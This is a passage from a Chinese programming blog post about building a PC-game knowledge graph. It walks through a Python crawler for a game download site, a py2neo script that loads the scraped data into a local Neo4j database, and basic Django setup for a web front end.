class="line">    classify_file = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_base_html</span>(<span class="params">self,url</span>):</span></span><br><span class="line">        res = requests.get(url,headers)</span><br><span class="line">        text = res.text.encode(<span class="string">&#x27;iso-8859-1&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_list</span>(<span class="params">self</span>):</span></span><br><span class="line">        base_html = self.get_base_html(self.base_url)</span><br><span class="line">        url_list = re.findall(<span class="string">&#x27;&lt;div class=&quot;famous-li&quot;&gt;&lt;a href=&quot;(/pcgame/.*?.html)&quot; target=&quot;_blank&quot; class=&quot;content-a&quot;&gt;&#x27;</span>, base_html)</span><br><span class="line"></span><br><span class="line">        name_list = []</span><br><span class="line">        author_list = []</span><br><span class="line">        language_list = []</span><br><span class="line">        time_list = []</span><br><span class="line">        classify_list = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">            url_html = self.get_base_html(<span class="string">&quot;https://down.ali213.net/&quot;</span>+url)</span><br><span class="line">            name_language = re.findall(<span class="string">&#x27;&lt;h1&gt;(.*?)&lt;/h1&gt;&#x27;</span>, url_html)</span><br><span class="line">            author = re.findall(<span class="string">&#x27;&lt;li&gt;游戏发行.(.*?)&lt;/li&gt;&#x27;</span>, url_html)</span><br><span class="line">            time = re.findall(<span class="string">&#x27;&lt;a href=&quot;/pcgame/all/0-0-(.*?)-0-new-pic-1.html&quot; target&#x27;</span>, url_html)</span><br><span class="line">            classify = re.findall(<span class="string">&#x27;-new-pic-1.html&quot; target=&quot;_blank&quot;&gt;(.*?)&lt;/a&gt;&#x27;</span>,url_html)</span><br><span class="line">            content = re.findall(<span class="string">&#x27;&lt;p&gt;\u3000\u3000(.*?)&lt;/p&gt;&#x27;</span>,url_html)</span><br><span class="line"></span><br><span class="line">            name_language = <span class="built_in">str</span>(name_language[<span class="number">0</span>]).rsplit(<span class="string">&quot; &quot;</span>,<span class="number">1</span>)</span><br><span class="line">            name = <span class="built_in">str</span>(name_language[<span class="number">0</span>])</span><br><span class="line">            language = <span class="built_in">str</span>(name_language[<span class="number">1</span>])</span><br><span class="line">            author = <span class="built_in">str</span>(author[<span class="number">0</span>])</span><br><span class="line">            time = <span class="built_in">str</span>(time[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">del</span> classify[<span class="number">1</span>:<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">            name_list.append(name)</span><br><span class="line">            author_list.append(author)</span><br><span class="line">            time_list.append(time)</span><br><span class="line">            language_list.append(language)</span><br><span class="line">            classify_list.append(classify)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(content) == <span class="number">0</span>:</span><br><span class="line">                self.content_file.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.content_file.write(<span class="built_in">str</span>(content[<span class="number">0</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">zip</span>(name_list,author_list,time_list,language_list,classify_list)):</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            self.name_file.write(<span class="built_in">str</span>(name_list[i]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.time_file.write(<span class="built_in">str</span>(time_list[i]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.language_file.write(<span class="built_in">str</span>(language_list[i]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.author_file.write(<span class="built_in">str</span>(author_list[i]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.url_file.write(<span class="built_in">str</span>(url_list[i]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.classify_file.write(<span class="built_in">str</span>(classify_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.size_file = <span class="built_in">open</span>(<span class="string">&#x27;data/size.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.author_file = <span class="built_in">open</span>(<span class="string">&#x27;data/author.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.time_file = <span class="built_in">open</span>(<span class="string">&#x27;data/time.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.language_file = <span class="built_in">open</span>(<span class="string">&#x27;data/language.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.content_file = <span class="built_in">open</span>(<span class="string">&#x27;data/content.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.url_file = <span class="built_in">open</span>(<span class="string">&#x27;data/url.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.classify_file = <span class="built_in">open</span>(<span class="string">&#x27;data/classify.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">            self.base_url = self.target_url+<span class="built_in">str</span>(i+<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now is &quot;</span>+self.base_url)</span><br><span class="line">            self.create_list()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">self</span>):</span></span><br><span class="line">        res = requests.get(self.target_url, headers)</span><br><span class="line">        <span class="built_in">print</span>(res.encoding)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cra = Crawler()</span><br><span class="line">    cra.run()</span><br></pre></td></tr></table></figure>
<p>知识图谱代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> py2neo <span class="keyword">import</span> Graph,Node,Relationship</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">classification = [<span class="string">&#x27;游戏名称&#x27;</span>,<span class="string">&#x27;游戏标签&#x27;</span>,<span class="string">&#x27;游戏类型&#x27;</span>,<span class="string">&#x27;游戏作者&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KG</span>:</span></span><br><span class="line">    name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    size_file = <span class="built_in">open</span>(<span class="string">&#x27;data/size.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    author_file = <span class="built_in">open</span>(<span class="string">&#x27;data/author.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    time_file = <span class="built_in">open</span>(<span class="string">&#x27;data/time.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    language_file = <span class="built_in">open</span>(<span class="string">&#x27;data/language.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    content_file = <span class="built_in">open</span>(<span class="string">&#x27;data/content.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    url_file = <span class="built_in">open</span>(<span class="string">&#x27;data/url.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    classify_file = <span class="built_in">open</span>(<span class="string">&#x27;data/classify.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">createEntity</span>(<span class="params">self,graph</span>):</span></span><br><span class="line">        cql = <span class="string">&#x27;&#x27;&#x27;CREATE (n:游戏数据库&#123;id:&#x27;0&#x27;, name:&#x27;游戏数据库&#x27;&#125;) RETURN n&#x27;&#x27;&#x27;</span></span><br><span class="line">        graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(classification):</span><br><span class="line">            cql = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                MERGE (a:游戏数据库&#123;id:&#x27;%d&#x27;, name:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b &#123;name: &#x27;游戏数据库&#x27;&#125;) </span></span><br><span class="line"><span class="string">                MERGE (b)-[:划分]-&gt;(a)</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span> % (i+<span class="number">1</span>, c)</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        name_list = self.name_file.readlines()</span><br><span class="line">        time_list = self.time_file.readlines()</span><br><span class="line">        language_list = self.language_file.readlines()</span><br><span class="line">        author_list = self.author_file.readlines()</span><br><span class="line">        content_list = self.content_file.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MERGE (:游戏名称&#123;id:&#x27;%d&#x27;,名称:&quot;%s&quot;,语言:&#x27;%s&#x27;,内容简述:&#x27;%s&#x27;,发售时间:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i, name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       language_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       content_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       time_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 1 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">        author_tmp_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(author_list)):</span><br><span class="line">            <span class="keyword">if</span> author_list[i] <span class="keyword">not</span> <span class="keyword">in</span> author_tmp_list:</span><br><span class="line">                author_tmp_list.append(author_list[i])</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MERGE (:游戏作者&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span> % (i, author_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 2 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">        classify_tmp_list = []</span><br><span class="line">        classify_tmp_list2 = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            classify_list = self.classify_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(classify_list)-<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> classify_list[j+<span class="number">1</span>] <span class="keyword">not</span> <span class="keyword">in</span> classify_tmp_list:</span><br><span class="line">                    classify_tmp_list.append(classify_list[j+<span class="number">1</span>])</span><br><span class="line">                    cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        MERGE (:游戏标签&#123;标签:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span> % (classify_list[j+<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                    graph.run(cql)</span><br><span class="line">                <span class="keyword">if</span> classify_list[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> classify_tmp_list2:</span><br><span class="line">                    classify_tmp_list2.append(classify_list[<span class="number">0</span>])</span><br><span class="line">                    cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        MERGE (:游戏类型&#123;类型:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span> % (classify_list[<span class="number">0</span>].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                    graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 3 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">createreRationship</span>(<span class="params">self,graph</span>):</span></span><br><span class="line">        self.name_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.time_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.size_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.language_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.content_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.author_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.classify_file.seek(<span class="number">0</span>)</span><br><span class="line">        name_list = self.name_file.readlines()</span><br><span class="line">        time_list = self.time_file.readlines()</span><br><span class="line">        size_list = self.size_file.readlines()</span><br><span class="line">        author_list = self.author_file.readlines()</span><br><span class="line">        language_list = self.language_file.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            classify_file = self.classify_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(classify_file)-<span class="number">1</span>):</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:游戏名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                          (b:游戏标签&#123;标签:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (b)-[:标签]-&gt;(a)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       classify_file[j+<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MATCH (a:游戏名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                      (b:游戏类型&#123;类型:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b)-[:类型]-&gt;(a)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                    classify_file[<span class="number">0</span>].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MATCH (a:游戏名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                      (b:游戏作者&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b)-[:制作]-&gt;(a)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                   i,author_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 4 down&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test_graph = Graph(<span class="string">&quot;http://127.0.0.1:7474/browser/&quot;</span>, auth=(<span class="string">&quot;neo4j&quot;</span>, <span class="string">&quot;123456789&quot;</span>))</span><br><span class="line">    test_graph.run(<span class="string">&#x27;match(n) detach delete n&#x27;</span>)</span><br><span class="line">    kg = KG()</span><br><span class="line">    kg.createEntity(test_graph)</span><br><span class="line">    kg.createreRationship(test_graph)</span><br></pre></td></tr></table></figure>
<h2 id="基于-Django-的-Web-界面"><a href="#基于-Django-的-Web-界面" class="headerlink" title="基于 Django 的 Web 界面"></a>基于 Django 的 Web 界面</h2><p>Django 是一个由 Python 编写的开放源代码的 Web 应用框架</p>
<p>本篇博客先介绍一下 Django 的使用，然后展示一下我自己写的测试网页</p>
<p><strong>建立 Django 项目</strong></p>
<p>创建一个 HelloWorld 项目，使用命令行输入：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">django-admin startproject HelloWorld</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>HelloWorld:</strong> 项目的容器</li>
<li><strong>manage.py:</strong> 一个实用的命令行工具，可让你以各种方式与该 Django 项目进行交互</li>
<li><strong>HelloWorld/<strong>init</strong>.py:</strong> 一个空文件，告诉 Python 该目录是一个 Python 包</li>
<li><strong>HelloWorld/asgi.py:</strong> 一个 ASGI 兼容的 Web 服务器的入口，以便运行你的项目</li>
<li><strong>HelloWorld/settings.py:</strong> 该 Django 项目的设置/配置</li>
<li><strong>HelloWorld/urls.py:</strong> 该 Django 项目的 URL 声明; 一份由 Django 驱动的网站”目录”</li>
<li><strong>HelloWorld/wsgi.py:</strong> 一个 WSGI 兼容的 Web 服务器的入口，以便运行你的项目</li>
</ul>
<p>使用如下命令启动：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py runserver</span><br></pre></td></tr></table></figure>
<p>在浏览器中使用如下网址：</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://127.0.0.1:8000/">The install worked successfully! Congratulations!</a>： </li>
</ul>
<img src="/2023/03/05/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%BA%8C/1677832398939.png" class width="1677832398939"> 
<p><strong>在 Django 里面加载 HTML 的 CSS 样式</strong></p>
<p>对于 Django 而言，加载 HTML，Django 会通过 templates 文件夹中放置的 HTML 来加载，有时需要嵌入 CSS 和 JS 等样式</p>
<p>在根目录下创建一个 base_views.py 文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.views.decorators <span class="keyword">import</span> csrf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&#x27;base.html&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>修改该根目录下 urls.py 文件中的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.contrib <span class="keyword">import</span> admin</span><br><span class="line">from django.urls <span class="keyword">import</span> re_path as url</span><br><span class="line">from . <span class="keyword">import</span> base_views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r<span class="number">&#x27;</span>^$<span class="string">&#x27;, base_views.index),</span></span><br><span class="line"><span class="string">]</span></span><br></pre></td></tr></table></figure>
<p>修改根目录下的 settings.py 中的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;DIRS&#x27;</span>: [os.path.join(BASE_DIR,<span class="string">&#x27;HelloWorld/templates&#x27;</span>)],</span><br></pre></td></tr></table></figure>
<ul>
<li>修改 TEMPLATES 下的 DIRS</li>
</ul>
<p>此时 Django 默认是对 CSS、JS 的静态文件是拒绝访问的，必须要在里面进行配置才行：</p>
<ul>
<li>在你建好的 Django 的根目录下新建 static 文件夹，在下面再新建 CSS，Images </li>
<li>在 <code>settings.py</code> 文件进行相关配置，在 <code>STATIC_URL = &#39;/static/&#39;</code> 后面加入如下代码：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STATICFILES_DIRS = ( os.path.join(BASE_DIR,<span class="string">&#x27;static&#x27;</span>), )</span><br></pre></td></tr></table></figure>
<p>最后需要对 html 进行修改，直接把 herf 链接写死</p>
<ul>
<li>修改前：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;css/normalize<span class="selector-class">.css</span>&quot;&gt; </span><br><span class="line">&lt;script <span class="attribute">src</span>=&quot;js/sakura<span class="selector-class">.js</span>&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>修改后：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/normalize<span class="selector-class">.css</span>&quot;&gt;  </span><br><span class="line">&lt;script <span class="attribute">src</span>=&quot;/static/js/sakura<span class="selector-class">.js</span>&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>最后对从网上下载的 HTML 进行魔改：</p>
<ul>
<li>源地址：<a target="_blank" rel="noopener" href="https://cs.rnmcnm.com/6/">异次元-起点 (rnmcnm.com)</a> </li>
</ul>
<p>效果如下：</p>
<img src="/2023/03/05/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%BA%8C/1677945206647.png" class width="1677945206647">  
<img src="/2023/03/05/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%BA%8C/1677945223326.png" class width="1677945223326"> 
<ul>
<li>关于 HTML 的编写不是本篇博客的重点，就略过了</li>
</ul>
<h2 id="基于-Echarts-的-Neo4j-可视化"><a href="#基于-Echarts-的-Neo4j-可视化" class="headerlink" title="基于 Echarts 的 Neo4j 可视化"></a>基于 Echarts 的 Neo4j 可视化</h2><p><strong>在 Django 项目中使用 Neo4j</strong></p>
<p>Django 可以把 Neo4j 中的知识图谱显示在前端页面上</p>
<p>我的做法是直接定义一个类用于连接 Neo4j：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Neo4j</span>():</span></span><br><span class="line">	graph = <span class="literal">None</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;create neo4j class ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">connectDB</span>(<span class="params">self</span>):</span></span><br><span class="line">		self.graph = Graph(<span class="string">&quot;http://localhost:7474&quot;</span>,auth=(<span class="string">&quot;neo4j&quot;</span>, <span class="string">&quot;123456789&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>并在根目录下 urls.py 文件所添加的函数中使用 Neo4j 类</p>
<ul>
<li>这里使用正则表达式来匹配 URL，如果匹配成功则调用后面的函数</li>
</ul>
